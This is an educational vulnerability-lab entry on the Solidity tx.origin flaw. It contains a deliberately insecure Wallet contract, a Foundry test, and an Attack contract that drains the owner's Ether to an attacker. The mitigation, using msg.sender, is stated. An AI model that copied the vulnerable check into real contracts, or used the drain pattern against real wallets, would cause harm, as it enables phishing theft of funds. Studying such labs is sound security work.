# txorigin - phishing  
[txorigin.sol](https://github.com/SunWeb3Sec/DeFiVulnLabs/blob/main/src/test/txorigin.sol)  
**Name:** Insecure tx.origin Vulnerability

**Description:**  
tx.origin is a global variable in Solidity; using this variable for authentication in
a smart contract makes the contract vulnerable to phishing attacks.

**Scenario:**  
Wallet is a simple contract where only the owner should be able to transfer
Ether to another address. Wallet.transfer() uses tx.origin to check that the
caller is the owner. Let's see how we can hack this contract

**What happened?**  
Alice was tricked into calling Attack.attack(). Inside Attack.attack(), it
requested a transfer of all funds in Alice's wallet to Eve's address.
Since tx.origin in Wallet.transfer() is equal to Alice's address,
it authorized the transfer. The wallet transferred all Ether to Eve.

**Mitigation:**
It is advisable to use msg.sender.

**REF:**

https://hackernoon.com/hacking-solidity-contracts-using-txorigin-for-authorization-are-vulnerable-to-phishing

**Contract:**  
``` 
contract Wallet {
    address public owner;

    constructor() payable {
        owner = msg.sender;
    }

    function transfer(address payable _to, uint _amount) public {
        // check with msg.sender instead of tx.origin
        require(tx.origin == owner, "Not owner");

        (bool sent, ) = _to.call{value: _amount}("");
        require(sent, "Failed to send Ether");
    }
}
```
****How to Test:****

forge test --contracts src/test/**txorigin.sol** -vvvv
```
// A function to test exploitation of the use of tx.origin.
function testtxorigin() public {
    // The addresses of 'alice' and 'eve' are obtained from the Ethereum virtual machine.
    address alice = vm.addr(1);
    address eve = vm.addr(2);

    // Alice is given 10 ether and Eve is given 1 ether.
    vm.deal(address(alice), 10 ether);
    vm.deal(address(eve), 1 ether);

    // A prank is played on Alice.
    vm.prank(alice);

    // Alice deploys a Wallet contract with 10 ether.
    WalletContract = new Wallet{value: 10 ether}();

    // The owner of the Wallet contract is logged.
    console.log("Owner of wallet contract", WalletContract.owner());

    // A prank is played on Eve.
    vm.prank(eve);

    // Eve deploys an Attack contract and provides the address of Alice's Wallet contract.
    AttackerContract = new Attack(WalletContract);

    // The owner of the Attack contract is logged.
    console.log("Owner of attack contract", AttackerContract.owner());

    // The balance of Eve is logged.
    console.log("Eve of balance", address(eve).balance);

    // Another prank is played on Alice and Alice is tricked into calling the attack function.
    vm.prank(alice, alice);
    AttackerContract.attack();

    // The tx.origin address and the msg.sender address are logged.
    console.log("tx origin address", tx.origin);
    console.log("msg.sender address", msg.sender);

    // The updated balance of Eve is logged.
    console.log("Eve of balance", address(eve).balance);
}

// The Attack contract that is used to exploit the Wallet contract.
contract Attack {
    address payable public owner;
    Wallet wallet;

    // The constructor takes a Wallet contract as argument.
    constructor(Wallet _wallet) {
        wallet = Wallet(_wallet);
        owner = payable(msg.sender);
    }

    // The attack function transfers all ether from the Wallet contract to the owner of the Attack contract.
    function attack() public {
        wallet.transfer(owner, address(wallet).balance);
    }
}
```
Red box: transferred all Ether to Eve.
![Alt text](image-15.png)